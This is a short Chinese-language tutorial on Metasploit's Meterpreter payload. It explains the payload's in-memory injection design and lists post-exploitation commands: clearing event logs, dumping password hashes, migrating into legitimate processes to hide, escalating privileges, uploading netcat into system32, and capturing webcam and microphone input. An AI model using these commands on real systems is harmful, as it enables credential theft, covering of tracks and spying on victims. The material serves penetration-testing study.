
# Meterpreter

* 介绍
> * 高级、动态、可扩展的Payload
>   - 基于meterpreter上下文利用更多漏洞发起攻击
>   - 后渗透测试阶段一站式操作界面
> * 完全基于内存的DLL注入式 payload（不写硬盘）
>   - 注入合法进程并建立stager
>   - 基于Stager上传和预加载DLL进行扩展模块的注入（客户端API）
>   - 基于stager建立的socket连接建立加密的TLS/1.0通信隧道
>   - 利用TLS隧道进一步加载后续扩展模块（避免网络取证）
> * 服务端使用C语言编写
> * 客户端提供基于ruby的全特性API（支持任何语言）


* 基本命令

1. help、background
2. run、bgrun　　　　　　　　
    - 前台为run，后台运行为bgrun
3. cd 、ls 、cat 、pwd 、dir 、mkdir 、mv 、rm 、rmdir 、edit
4. lpwd 、lcd　　　　　　　　　　
    - 操作本机卡里的切换目录和显示当前目录
5. clearev 、download 、upload　　　　　　
    - clearav代表清除日志记录、download（下载）、upload（上传）
    - upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
6. execute -f cmd.exe -i –H　　　　　　
    - 执行某个程序或命令
7. getuid 、getsystem 、getprivs 、getproxy 、getpid　　　　　　
    - 字面意思
8. hashdump 、run post/windows/gather/hashdump　　　　　　
    - 将显示账号经过hash之后对应的密码
9. sysinfo 、ps 、kill 、migrate 、reboot 、shutdown 、shell　　　　
    - 通过getpid获取当前进程ID，然后ps查看所有的进程ID，再migrate  PID，这样有利于隐蔽（将shell注入到系统的正常进程中）
10. show_mount 、search -f autoexec.bat　　　　　　
    - 查看挂载已经搜索文件
11. arp 、netstat 、ipconfig 、ifconfig 、route　　　　　　　　　　
12. idletime 、resource　　　　　　　　　　　　　　
13. record_mic 、webcam_list 、webcam_snap -i 1 -v false　　　　
    - 麦克风、摄像头、截图，每隔一秒截图一张


* python扩展

> 无需运行环境，在客户端运行原生 python 代码
``` 
// meterpreter
// 重点，python扩展，通过其可以编写自己的python程序，然后通过文件导入进来
load python
Help
python_execute "import os; cd = os.getcwd()" -r cd
python_import -f find.py

```
